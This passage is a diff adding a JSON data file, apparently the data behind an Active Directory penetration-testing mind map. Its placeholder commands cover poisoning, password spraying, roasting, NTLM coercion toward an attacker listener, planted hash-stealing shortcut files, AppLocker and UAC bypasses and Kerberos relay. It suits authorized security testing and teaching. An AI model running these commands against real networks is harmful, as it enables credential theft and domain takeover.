@@ -1,0 +1,7295 @@
+{
+ "matrix": [
+  [
+   "no_creds",
+   "valid_user",
+   "authenticated",
+   "low_access",
+   "delegation",
+   "admin",
+   "dom_admin"
+  ],
+  [
+   "low_hanging",
+   "mitm",
+   "",
+   "know_vuln_auth",
+   "adcs",
+   "lat_move",
+   "trusts"
+  ],
+  [
+   "authors",
+   "crack_hash",
+   "",
+   "acl",
+   "sccm",
+   "",
+   "persistence"
+  ]
+ ],
+ "categories": {
+  "no_creds": {
+   "title": "No Credentials",
+   "subjects": [
+    {
+     "title": "Scan network",
+     "flows": [
+      [
+       "Vulnerable host"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip_range>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -sP -p <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -Pn -sV --top-ports 50 --open <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -Pn --script smb-vuln* -p139,445 <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -Pn -sC -sV -oA <output> <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -Pn -sC -sV -p- -oA <output> <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -sU -sC -sV -oA <output> <ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Find DC IP",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmcli dev show <interface>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -p 88 --open <ip_range>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Zone transfer",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "dig axfr <domain_name> @<name_server>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Anonymous & Guest access on SMB shares",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u '' -p ''",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u 'a' -p ''",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "enum4linux-ng.py -a -u '' -p '' <ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "smbclient -U '%' -L //<ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Enumerate LDAP",
+     "flows": [
+      [
+       "Username"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ldapsearch -x -H <dc_ip> -s base",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Enumerate Users",
+     "flows": [
+      [
+       "Username"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> --users",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Bruteforce users",
+     "flows": [
+      [
+       "Username"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "kerbrute userenum -d <domain> <userlist>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm= '<domain>',userdb=<user_list_file>\" <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Poisoning",
+     "flows": [
+      [
+       "poisoning SMB",
+       "poisoning LDAP",
+       "poisoning HTTP"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "LLMNR / NBTNS / MDNS",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "responder -l <interface>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "\u26a0\ufe0f DHCPv6 (IPv6 prefered to IPv4)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "mitm6 -d <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "bettercap",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "\u26a0\ufe0f ARP Poisoning",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "bettercap",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "asreqroast",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Pcredz -i <interface> -v`",
+       "cve": false,
+       "flow": "Hash found ASREQ"
+      }
+     ]
+    },
+    {
+     "title": "Coerce",
+     "flows": [
+      [
+       "Coerce SMB"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Unauthenticated PetitPotam (CVE-2022-26925)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "petitpotam.py -d <domain> <listener> <target>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "PXE",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "no password",
+       "cve": false,
+       "flow": "Credentials (NAA account)"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "pxethief.py 1",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "pxethief.py 2 <distribution_point_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "password protected",
+       "cve": false,
+       "flow": "PXE Hash"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "tftp -i <dp_ip> GET \"\\xxx\\boot.var\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "pxethief.py 5 '\\xxx\\boot.var'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "TimeRoasting",
+     "flows": [
+      [
+       "timeroast hash"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "timeroast.py <dc_ip> -o <output_log>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "valid_user": {
+   "title": "Valid user (no password)",
+   "subjects": [
+    {
+     "title": "Password Spray",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "default policy",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
+       "cve": false,
+       "flow": null,
+       "link": "[https://www.thehacker.recipes/ad/recon/password-policy](https://www.thehacker.recipes/ad/recon/password-policy)"
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Get-ADDefaultDomainPasswordPolicy",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Fined Policy (Privileged)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "Get-ADFineGainedPasswordPolicy -filter *",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "\u26a0\ufe0f user == password",
+       "cve": false,
+       "flow": "Clear text Credentials"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "\u26a0\ufe0f usuals passwords  (SeasonYear!, Company123, ...)",
+       "cve": false,
+       "flow": "Clear text Credentials"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "kerbrute passwordspray -d <domain> <users.txt> <password>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "ASREPRoast",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "List ASREPRoastable Users (need creds)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "ASREP roasting",
+       "cve": false,
+       "flow": "Hash found ASREP"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Rubeus.exe asreproast /format:hashcat",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Blind Kerberoasting",
+       "cve": false,
+       "flow": "Hash found TGS"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>\"/",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2022-33679",
+       "cve": true,
+       "flow": "Lat move PTT"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "CVE-2022-33679.py <domain>/<user> <target>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "authenticated": {
+   "title": "Valid Credentials (cleartext creds, nt hash, kerberos ticket)",
+   "subjects": [
+    {
+     "title": "Classic Enumeration (users, shares, ACL, delegation, ...)",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Find all users",
+       "cve": false,
+       "flow": "Username"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u '<user>' -p '<password>' --users",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Enumerate SMB share",
+       "cve": false,
+       "flow": "Scroll shares"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\\\<filename> <filename>]",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Bloodhound Legacy",
+       "cve": false,
+       "flow": "ACL || Delegation || Username"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sharphound.exe -c all -d <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Bloodhound CE",
+       "cve": false,
+       "flow": "ACL || Delegation || Username"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "sharphound.exe -c all -d <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Enumerate Ldap",
+       "cve": false,
+       "flow": "ACL || Delegation || Username"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Enumerate DNS",
+       "cve": false,
+       "flow": "New targets (low hanging fruit)"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "adidnsdump -u <domain>\\\\<user> -p \"<password>\" --print-zones <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Enumerate ADCS",
+     "flows": [
+      [
+       "ADCS Exploitation"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certify.exe find",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Enumerate SCCM",
+     "flows": [
+      [
+       "SCCM Exploitation"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "SharpSCCM.exe local site-info",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Scan Auto",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "from BH result",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "PingCastle.exe --healthcheck --server <domain>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Kerberoasting",
+     "flows": [
+      [
+       "Hash TGS"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "Rubeus.exe kerberoast",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Coerce",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Drop file",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": ".lnk",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": ".scf",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": ".url",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "[InternetShortcut]... IconFile=\\\\<attacker_ip>\\%USERNAME%.icon",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Other files",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "ntlm_theft.py -g all -s <your_ip> -f test",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Webdav",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Enable webclient",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": false,
+       "t": ".searchConnector-ms",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 3,
+       "cmd": true,
+       "t": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "add attack computer in dns",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Launch coerce with <attacker_hostname>@80/x as target",
+       "cve": false,
+       "flow": "HTTP Coerce"
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "RPC call",
+       "cve": false,
+       "flow": "SMB NTLM Coerce"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Coerce kerberos",
+       "cve": false,
+       "flow": "SMB Kerberos coerce"
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Intra ID Connect",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Find MSOL",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Can Connect to a computer",
+     "flows": [
+      [
+       "Lateral move"
+      ]
+     ],
+     "items": []
+    },
+    {
+     "title": "Exploit",
+     "flows": [
+      [
+       "know vulnerabilities"
+      ]
+     ],
+     "items": []
+    }
+   ]
+  },
+  "low_access": {
+   "title": "Low access (Privilege escalation)",
+   "subjects": [
+    {
+     "title": "Bypass Applocker",
+     "flows": [
+      [
+       "Low access (without applocker)"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "Get-Applocker infos",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies \\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "files in writables paths",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "C:\\Windows\\Temp",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "C:\\Windows\\Tasks",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "mshta.exe my.hta",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "MsBuild.exe pshell.xml",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "UAC bypass",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "Fodhelper.exe",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "wsreset.exe",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "msdt.exe",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Auto Enum",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "winPEASany_ofs.exe",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": true,
+       "t": ".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended\"",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Search files",
+     "flows": [
+      [
+       "User Account"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "findstr /si 'pass' *.txt *.xml *.docx *.ini",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Exploit",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "SMBGhost CVE-2020-0796",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "CVE-2021-36934 (HiveNightmare/SeriousSAM)",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "vssadmin list shadows",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Webdav",
+     "flows": [
+      [
+       "HTTP Coerce"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "open file <file>.searchConnector-ms",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "petitpotam.py -u '<user>' -p <pass> -d '<domain>' \"attacker@80/random.txt\" <ip>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "Kerberos Relay",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": true,
+       "t": "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    },
+    {
+     "title": "From Service account (SEImpersonate)",
+     "flows": [
+      [
+       "Admin"
+      ]
+     ],
+     "items": [
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "RoguePatato",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "GodPotato",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "PrintSpoofer",
+       "cve": true,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "RemotePotato0",
+       "cve": false,
+       "flow": null
+      }
+     ]
+    }
+   ]
+  },
+  "delegation": {
+   "title": "Kerberos Delegation",
+   "subjects": [
+    {
+     "title": "Find delegation",
+     "flows": [],
+     "items": [
+      {
+       "d": 0,
+       "cmd": true,
+       "t": "findDelegation.py \"<domain>\"/\"<user>\":\"<password>\"",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 0,
+       "cmd": false,
+       "t": "With BloodHound",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Unconstrained",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "MATCH (c:User {unconstraineddelegation:true}) RETURN c",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 1,
+       "cmd": false,
+       "t": "Constrained",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p",
+       "cve": false,
+       "flow": null
+      },
+      {
+       "d": 2,
+       "cmd": true,
+       "t": "MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"<MYTARGET.FQDN>\"})) RETURN p",
+       "cve": false,
+       "flow": null
+      }
+     ]
